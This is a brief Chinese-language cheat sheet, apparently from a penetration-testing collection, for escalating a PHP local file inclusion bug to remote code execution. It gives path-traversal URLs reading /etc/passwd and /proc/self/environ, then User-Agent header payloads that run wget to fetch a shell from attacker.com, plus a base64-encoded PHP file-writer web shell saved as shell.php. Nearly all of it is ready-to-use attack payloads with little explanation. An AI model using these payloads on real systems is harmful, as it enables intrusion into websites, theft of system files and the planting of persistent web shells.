	当有个lfi时
	https://www.website.com/index.php?pg=../../../../etc/passwd
	尝试包含/proc/self/environ
	https://www.website.com/index.php?pg=../../../../proc/self/environ
	若是存在user-agent标识
	修改ua来实现rce:
	User-Agent: <?system('wget http://attacker.com/shell.txt -O shell.php');?>
	User-Agent: <?exec('wget http://attacker.com/shell.txt -O shell.php');?>
	User-Agent: <?php phpinfo(); ?>
	也可以在服务器内部来创建文件写入shell
	User-Agent: <?php $a = base64_decode('PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg=='); $file = fopen('shell.php','w'); echo fwrite($file,$a); fclose($file); ?>
